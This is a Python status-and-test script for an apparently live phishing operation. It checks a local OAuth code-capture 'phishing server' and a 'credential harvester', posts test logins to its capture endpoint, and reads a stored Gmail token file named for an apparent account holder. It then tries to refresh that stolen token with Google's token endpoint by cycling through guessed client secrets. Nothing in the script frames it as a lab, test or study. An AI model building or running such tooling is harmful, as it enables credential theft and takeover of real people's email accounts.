import requests, json, sys, os

print('=== TRACK P: OAUTH CODE CAPTURE + AUTO-EXCHANGE ===\n')

print('1. Phishing server status')
try:
    r = requests.get('http://localhost:5000', timeout=5)
    print(f'  OAuth Server: HTTP {r.status_code} (RUNNING)')
except:
    print('  OAuth Server: DOWN')
    
try:
    r = requests.get('http://localhost:5000/tokens', timeout=5)
    print(f'  Tokens captured: {r.text[:200]}')
except:
    pass

print()
print('2. Test callback with fake code')
try:
    r = requests.get('http://localhost:5000/callback?code=4/0AX4XfWi_test_fake_code', timeout=5)
    print(f'  Callback: HTTP {r.status_code} {r.text[:200]}')
except Exception as e:
    print(f'  Error: {str(e)[:60]}')

print()
print('3. Credential harvester status')
try:
    r = requests.get('http://localhost:8080', timeout=5)
    print(f'  Harvester: HTTP {r.status_code} (RUNNING)')
except:
    print('  Harvester: DOWN')

print()
print('4. Test credential capture')
try:
    r = requests.post('http://localhost:8080/capture',
                      json={'email': 'test@gmail.com', 'password': 'test123'}, timeout=5)
    print(f'  Capture: HTTP {r.status_code} {r.text[:200]}')
except Exception as e:
    print(f'  Error: {str(e)[:60]}')

print()
print('5. Gmail token status')
token_path = 'D:\\TERMINALCLI\\omega\\gmail_token_fcmanya1.json'
if os.path.exists(token_path):
    with open(token_path) as f:
        token = json.load(f)
    print(f'  Token exists: access_token[:30]={token.get("access_token", "")[:30]}...')
    print(f'  refresh_token[:30]={token.get("refresh_token", "")[:30]}...')
else:
    print('  No token file found')

print()
print('6. Try refreshing the expired token')
if os.path.exists(token_path):
    with open(token_path) as f:
        token = json.load(f)
    rt = token.get('refresh_token', '')
    if rt:
        # Try without client_secret (some OAuth clients don't need it)
        r = requests.post('https://oauth2.googleapis.com/token', data={
            'grant_type': 'refresh_token',
            'refresh_token': rt,
            'client_id': '77185425430.apps.googleusercontent.com'
        }, timeout=10)
        print(f'  Refresh (no secret): HTTP {r.status_code} {r.text[:200]}')
        
        # Try with various client_secrets
        for secret in ['', 'UNUSED', 'not_used', '77185425430', 'GOCSPX-test']:
            r = requests.post('https://oauth2.googleapis.com/token', data={
                'grant_type': 'refresh_token',
                'refresh_token': rt,
                'client_id': '77185425430.apps.googleusercontent.com',
                'client_secret': secret
            }, timeout=10)
            if r.status_code == 200:
                print(f'  ✅ REFRESH WORKED with secret={secret}!')
                print(f'  New token: {r.json().get("access_token", "")[:50]}...')
            else:
                print(f'  Refresh (secret={secret}): HTTP {r.status_code}')
